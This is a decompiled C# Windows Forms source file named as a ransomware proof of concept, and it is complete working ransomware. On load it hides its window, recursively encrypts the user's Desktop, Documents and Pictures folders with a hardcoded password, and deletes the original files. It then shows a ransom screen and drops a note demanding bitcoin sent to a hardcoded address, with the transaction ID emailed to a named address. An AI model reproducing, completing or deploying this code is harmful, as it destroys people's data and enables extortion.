using System;
using System.ComponentModel;
using System.Drawing;
using System.IO;
using System.Security.Cryptography;
using System.Text;
using System.Windows.Forms;
using WindowsFormsApp1.Properties;

namespace RansomwarePOC;

public class Form1 : Form
{
	private const bool DELETE_ALL_ORIGINALS = true;

	private const bool ENCRYPT_DESKTOP = true;

	private const bool ENCRYPT_DOCUMENTS = true;

	private const bool ENCRYPT_PICTURES = true;

	private const string ENCRYPTED_FILE_EXTENSION = ".locked";

	private const string ENCRYPT_PASSWORD = "Password1";

	private const string BITCOIN_ADDRESS = "1BtUL5dhVXHwKLqSdhjyjK9Pe64Vc6CEH1";

	private const string BITCOIN_RANSOM_AMOUNT = "1";

	private const string EMAIL_ADDRESS = "danielthai101514@gmail.com";

	private static string ENCRYPTION_LOG = "";

	private string RANSOM_LETTER = "All of your files have been encrypted.\n\nTo unlock them, please send 1 bitcoin(s) to BTC address: 1BtUL5dhVXHwKLqSdhjyjK9Pe64Vc6CEH1\nAfterwards, please email your transaction ID to: danielthai101514@gmail.com\n\nThank you and have a nice day!\n\nEncryption Log:\n----------------------------------------\n";

	private string DESKTOP_FOLDER = Environment.GetFolderPath(Environment.SpecialFolder.DesktopDirectory);

	private string DOCUMENTS_FOLDER = Environment.GetFolderPath(Environment.SpecialFolder.Personal);

	private string PICTURES_FOLDER = Environment.GetFolderPath(Environment.SpecialFolder.MyPictures);

	private static int encryptedFileCount = 0;

	private IContainer components = null;

	private Label lblCount;

	private Label lblBitcoinAmount;

	private Label label2;

	private TextBox txtBitcoinAddress;

	private TextBox txtEmailAddress;

	private Label label3;

	private PictureBox pictureBox1;

	public Form1()
	{
		InitializeComponent();
	}

	private void Form1_Load(object sender, EventArgs e)
	{
		initializeForm();
		encryptFolderContents(DESKTOP_FOLDER);
		encryptFolderContents(PICTURES_FOLDER);
		encryptFolderContents(DOCUMENTS_FOLDER);
		if (encryptedFileCount > 0)
		{
			formatFormPostEncryption();
			dropRansomLetter();
		}
		else
		{
			Console.Out.WriteLine("No files to encrypt.");
			Application.Exit();
		}
	}

	private void dropRansomLetter()
	{
		StreamWriter streamWriter = new StreamWriter(DESKTOP_FOLDER + "\\___RECOVER__FILES__.locked.txt");
		streamWriter.WriteLine(RANSOM_LETTER);
		streamWriter.WriteLine(ENCRYPTION_LOG);
		streamWriter.Close();
	}

	private void formatFormPostEncryption()
	{
		((Form)this).set_Opacity(100.0);
		((Form)this).set_WindowState((FormWindowState)0);
		((Control)lblCount).set_Text("Your files (count: " + encryptedFileCount + ") have been encrypted!");
	}

	private void initializeForm()
	{
		((Form)this).set_Opacity(0.0);
		((Form)this).set_ShowInTaskbar(false);
		((Control)lblBitcoinAmount).set_Text("Please send 1 Bitcoin(s) to the following BTC address:");
		((Control)txtBitcoinAddress).set_Text("1BtUL5dhVXHwKLqSdhjyjK9Pe64Vc6CEH1");
		((Control)txtEmailAddress).set_Text("danielthai101514@gmail.com");
		((Control)lblBitcoinAmount).Focus();
	}

	private static void encryptFolderContents(string sDir)
	{
		try
		{
			string[] files = Directory.GetFiles(sDir);
			foreach (string text in files)
			{
				if (!text.Contains(".locked"))
				{
					Console.Out.WriteLine("Encrypting: " + text);
					FileEncrypt(text, "Password1");
				}
			}
			string[] directories = Directory.GetDirectories(sDir);
			foreach (string sDir2 in directories)
			{
				encryptFolderContents(sDir2);
			}
		}
		catch (Exception ex)
		{
			Console.WriteLine(ex.Message);
		}
	}

	private static void FileEncrypt(string inputFile, string password)
	{
		byte[] array = GenerateRandomSalt();
		FileStream fileStream = new FileStream(inputFile + ".locked", FileMode.Create);
		byte[] bytes = Encoding.UTF8.GetBytes(password);
		RijndaelManaged rijndaelManaged = new RijndaelManaged();
		rijndaelManaged.KeySize = 256;
		rijndaelManaged.BlockSize = 128;
		rijndaelManaged.Padding = PaddingMode.PKCS7;
		Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(bytes, array, 50000);
		rijndaelManaged.Key = rfc2898DeriveBytes.GetBytes(rijndaelManaged.KeySize / 8);
		rijndaelManaged.IV = rfc2898DeriveBytes.GetBytes(rijndaelManaged.BlockSize / 8);
		rijndaelManaged.Mode = CipherMode.CBC;
		fileStream.Write(array, 0, array.Length);
		CryptoStream cryptoStream = new CryptoStream(fileStream, rijndaelManaged.CreateEncryptor(), CryptoStreamMode.Write);
		FileStream fileStream2 = new FileStream(inputFile, FileMode.Open);
		byte[] array2 = new byte[1048576];
		try
		{
			int count;
			while ((count = fileStream2.Read(array2, 0, array2.Length)) > 0)
			{
				cryptoStream.Write(array2, 0, count);
			}
			fileStream2.Close();
		}
		catch (Exception ex)
		{
			Console.WriteLine("Error: " + ex.Message);
		}
		finally
		{
			ENCRYPTION_LOG = ENCRYPTION_LOG + inputFile + "\n";
			encryptedFileCount++;
			cryptoStream.Close();
			fileStream.Close();
			File.Delete(inputFile);
		}
	}

	private static void FileDecrypt(string inputFile, string outputFile, string password)
	{
		byte[] bytes = Encoding.UTF8.GetBytes(password);
		byte[] array = new byte[32];
		FileStream fileStream = new FileStream(inputFile, FileMode.Open);
		fileStream.Read(array, 0, array.Length);
		RijndaelManaged rijndaelManaged = new RijndaelManaged();
		rijndaelManaged.KeySize = 256;
		rijndaelManaged.BlockSize = 128;
		Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(bytes, array, 50000);
		rijndaelManaged.Key = rfc2898DeriveBytes.GetBytes(rijndaelManaged.KeySize / 8);
		rijndaelManaged.IV = rfc2898DeriveBytes.GetBytes(rijndaelManaged.BlockSize / 8);
		rijndaelManaged.Padding = PaddingMode.PKCS7;
		rijndaelManaged.Mode = CipherMode.CBC;
		CryptoStream cryptoStream = new CryptoStream(fileStream, rijndaelManaged.CreateDecryptor(), CryptoStreamMode.Read);
		FileStream fileStream2 = new FileStream(outputFile, FileMode.Create);
		byte[] array2 = new byte[1048576];
		try
		{
			int count;
			while ((count = cryptoStream.Read(array2, 0, array2.Length)) > 0)
			{
				fileStream2.Write(array2, 0, count);
			}
		}
		catch (CryptographicException ex)
		{
			Console.WriteLine("CryptographicException error: " + ex.Message);
		}
		catch (Exception ex2)
		{
			Console.WriteLine("Error: " + ex2.Message);
		}
		try
		{
			cryptoStream.Close();
		}
		catch (Exception ex3)
		{
			Console.WriteLine("Error by closing CryptoStream: " + ex3.Message);
		}
		finally
		{
			fileStream2.Close();
			fileStream.Close();
		}
	}

	public static byte[] GenerateRandomSalt()
	{
		byte[] array = new byte[32];
		using (RNGCryptoServiceProvider rNGCryptoServiceProvider = new RNGCryptoServiceProvider())
		{
			for (int i = 0; i < 10; i++)
			{
				rNGCryptoServiceProvider.GetBytes(array);
			}
		}
		return array;
	}

	protected override void Dispose(bool disposing)
	{
		if (disposing && components != null)
		{
			components.Dispose();
		}
		((Form)this).Dispose(disposing);
	}

	private void InitializeComponent()
	{
		//IL_0001: Unknown result type (might be due to invalid IL or missing references)
		//IL_000b: Expected O, but got Unknown
		//IL_000c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0016: Expected O, but got Unknown
		//IL_0017: Unknown result type (might be due to invalid IL or missing references)
		//IL_0021: Expected O, but got Unknown
		//IL_0022: Unknown result type (might be due to invalid IL or missing references)
		//IL_002c: Expected O, but got Unknown
		//IL_002d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0037: Expected O, but got Unknown
		//IL_0038: Unknown result type (might be due to invalid IL or missing references)
		//IL_0042: Expected O, but got Unknown
		//IL_0043: Unknown result type (might be due to invalid IL or missing references)
		//IL_004d: Expected O, but got Unknown
		//IL_007e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0088: Expected O, but got Unknown
		//IL_00b5: Unknown result type (might be due to invalid IL or missing references)
		//IL_012f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0139: Expected O, but got Unknown
		//IL_016a: Unknown result type (might be due to invalid IL or missing references)
		//IL_01e4: Unknown result type (might be due to invalid IL or missing references)
		//IL_01ee: Expected O, but got Unknown
		//IL_021f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0298: Unknown result type (might be due to invalid IL or missing references)
		//IL_02a2: Expected O, but got Unknown
		//IL_02c6: Unknown result type (might be due to invalid IL or missing references)
		//IL_034a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0354: Expected O, but got Unknown
		//IL_0378: Unknown result type (might be due to invalid IL or missing references)
		//IL_03fd: Unknown result type (might be due to invalid IL or missing references)
		//IL_0407: Expected O, but got Unknown
		//IL_0435: Unknown result type (might be due to invalid IL or missing references)
		//IL_05c6: Unknown result type (might be due to invalid IL or missing references)
		lblCount = new Label();
		lblBitcoinAmount = new Label();
		label2 = new Label();
		txtBitcoinAddress = new TextBox();
		txtEmailAddress = new TextBox();
		label3 = new Label();
		pictureBox1 = new PictureBox();
		((ISupportInitialize)pictureBox1).BeginInit();
		((Control)this).SuspendLayout();
		((Control)lblCount).set_Anchor((AnchorStyles)14);
		((Control)lblCount).set_Font(new Font("Yu Gothic", 28.2f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)lblCount).set_ForeColor(Color.Red);
		((Control)lblCount).set_Location(new Point(13, 7));
		((Control)lblCount).set_Margin(new Padding(4, 0, 4, 0));
		((Control)lblCount).set_Name("lblCount");
		((Control)lblCount).set_Size(new Size(1219, 68));
		((Control)lblCount).set_TabIndex(0);
		((Control)lblCount).set_Text("Your files (count: n) have been encrypted!");
		lblCount.set_TextAlign((ContentAlignment)32);
		((Control)lblBitcoinAmount).set_Anchor((AnchorStyles)14);
		((Control)lblBitcoinAmount).set_Font(new Font("Yu Gothic", 24f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)lblBitcoinAmount).set_ForeColor(Color.Red);
		((Control)lblBitcoinAmount).set_Location(new Point(13, 169));
		((Control)lblBitcoinAmount).set_Margin(new Padding(4, 0, 4, 0));
		((Control)lblBitcoinAmount).set_Name("lblBitcoinAmount");
		((Control)lblBitcoinAmount).set_Size(new Size(1219, 68));
		((Control)lblBitcoinAmount).set_TabIndex(1);
		((Control)lblBitcoinAmount).set_Text("Please send n Bitcoin(s) to the following BTC address:");
		lblBitcoinAmount.set_TextAlign((ContentAlignment)32);
		((Control)label2).set_Anchor((AnchorStyles)14);
		((Control)label2).set_Font(new Font("Yu Gothic", 24f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)label2).set_ForeColor(Color.Red);
		((Control)label2).set_Location(new Point(13, 298));
		((Control)label2).set_Margin(new Padding(4, 0, 4, 0));
		((Control)label2).set_Name("label2");
		((Control)label2).set_Size(new Size(1219, 68));
		((Control)label2).set_TabIndex(2);
		((Control)label2).set_Text("Next, E-mail your transaction ID to the following address:");
		label2.set_TextAlign((ContentAlignment)32);
		((Control)txtBitcoinAddress).set_Anchor((AnchorStyles)2);
		((Control)txtBitcoinAddress).set_Font(new Font("Yu Gothic", 24f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)txtBitcoinAddress).set_Location(new Point(181, 232));
		((Control)txtBitcoinAddress).set_Margin(new Padding(4, 4, 4, 4));
		((Control)txtBitcoinAddress).set_Name("txtBitcoinAddress");
		((TextBoxBase)txtBitcoinAddress).set_ReadOnly(true);
		((Control)txtBitcoinAddress).set_Size(new Size(901, 72));
		((Control)txtBitcoinAddress).set_TabIndex(3);
		((Control)txtBitcoinAddress).set_Text("1BtUL5dhVXHwKLqSdhjyjK9Pe64Vc6CEH1");
		txtBitcoinAddress.set_TextAlign((HorizontalAlignment)2);
		((Control)txtEmailAddress).set_Anchor((AnchorStyles)2);
		((Control)txtEmailAddress).set_Font(new Font("Yu Gothic", 24f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)txtEmailAddress).set_Location(new Point(181, 370));
		((Control)txtEmailAddress).set_Margin(new Padding(4, 4, 4, 4));
		((Control)txtEmailAddress).set_Name("txtEmailAddress");
		((TextBoxBase)txtEmailAddress).set_ReadOnly(true);
		((Control)txtEmailAddress).set_Size(new Size(901, 72));
		((Control)txtEmailAddress).set_TabIndex(4);
		((Control)txtEmailAddress).set_Text("friendly.cyber.criminal@gmail.com");
		txtEmailAddress.set_TextAlign((HorizontalAlignment)2);
		((Control)label3).set_Anchor((AnchorStyles)14);
		((Control)label3).set_Font(new Font("Yu Gothic", 28.2f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)label3).set_ForeColor(Color.Red);
		((Control)label3).set_Location(new Point(13, 75));
		((Control)label3).set_Margin(new Padding(4, 0, 4, 0));
		((Control)label3).set_Name("label3");
		((Control)label3).set_Size(new Size(1219, 107));
		((Control)label3).set_TabIndex(5);
		((Control)label3).set_Text("In order to recover your data...");
		label3.set_TextAlign((ContentAlignment)2);
		pictureBox1.set_Image((Image)(object)Resources.gesloten_slot);
		((Control)pictureBox1).set_Location(new Point(537, 449));
		((Control)pictureBox1).set_Name("pictureBox1");
		((Control)pictureBox1).set_Size(new Size(197, 206));
		pictureBox1.set_SizeMode((PictureBoxSizeMode)4);
		pictureBox1.set_TabIndex(9);
		pictureBox1.set_TabStop(false);
		((ContainerControl)this).set_AutoScaleDimensions(new SizeF(8f, 16f));
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		((Control)this).set_BackColor(Color.Black);
		((Form)this).set_ClientSize(new Size(1251, 656));
		((Control)this).get_Controls().Add((Control)(object)pictureBox1);
		((Control)this).get_Controls().Add((Control)(object)label3);
		((Control)this).get_Controls().Add((Control)(object)txtEmailAddress);
		((Control)this).get_Controls().Add((Control)(object)txtBitcoinAddress);
		((Control)this).get_Controls().Add((Control)(object)label2);
		((Control)this).get_Controls().Add((Control)(object)lblBitcoinAmount);
		((Control)this).get_Controls().Add((Control)(object)lblCount);
		((Form)this).set_FormBorderStyle((FormBorderStyle)1);
		((Form)this).set_Margin(new Padding(4, 4, 4, 4));
		((Form)this).set_MaximizeBox(false);
		((Form)this).set_MinimizeBox(false);
		((Control)this).set_Name("Form1");
		((Control)this).set_Text("Warning!");
		((Form)this).set_WindowState((FormWindowState)1);
		((Form)this).add_Load((EventHandler)Form1_Load);
		((ISupportInitialize)pictureBox1).EndInit();
		((Control)this).ResumeLayout(false);
		((Control)this).PerformLayout();
	}
}
